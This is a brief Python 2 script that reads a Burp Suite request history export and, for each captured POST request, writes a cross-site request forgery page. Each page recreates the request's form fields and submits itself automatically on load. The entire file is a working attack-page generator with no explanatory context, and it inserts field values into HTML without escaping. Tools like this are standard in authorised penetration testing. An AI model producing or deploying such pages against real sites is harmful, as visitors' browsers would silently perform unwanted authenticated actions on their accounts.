#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import argparse
import base64
from urlparse import parse_qsl
from xml.dom import minidom


def decode_form_urlencoded_values(request_body, encoding='utf-8'):
    for pair in parse_qsl(request_body, keep_blank_values=True):
        yield tuple(i.decode(encoding) for i in pair)


def format_input(name, value):
    return '<input type="text" name="%s" value="%s"/>' % (name, value)


def generate(index, item):
    url = item.getElementsByTagName('url')[0].firstChild.wholeText
    method = item.getElementsByTagName('method')[0].firstChild.wholeText
    if method.lower() != 'post':
        print "Only post request supported."
        return

    request = item.getElementsByTagName('request')[0]
    content = request.firstChild.wholeText
    base64_attr = request.attributes['base64']
    if base64_attr is not None and base64_attr.value == 'true':
        content = base64.b64decode(content)
    _, body = content.split("\r\n\r\n", 1)

    form = '''<form action="%s" method="post">
%s
<script> document.forms[0].submit(); </script>
</form>'''

    inputs = '\n'.join([format_input(name, value) for name, value in
                       decode_form_urlencoded_values(body)])
    html = form % (url, inputs)
    output_file = 'csrf_' + str(index) + '.html'
    with open(output_file, 'wb') as f:
        f.write(html.encode('utf-8'))


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input', type=str, required=True,
                        help='The burp history xml file.')
    args = vars(parser.parse_args(argv))
    input_file = args['input']
    xml_doc = minidom.parse(input_file)
    item_list = xml_doc.getElementsByTagName('item')
    [generate(index, item) for index, item in enumerate(item_list)]


if __name__ == '__main__':
    main(sys.argv[1:])
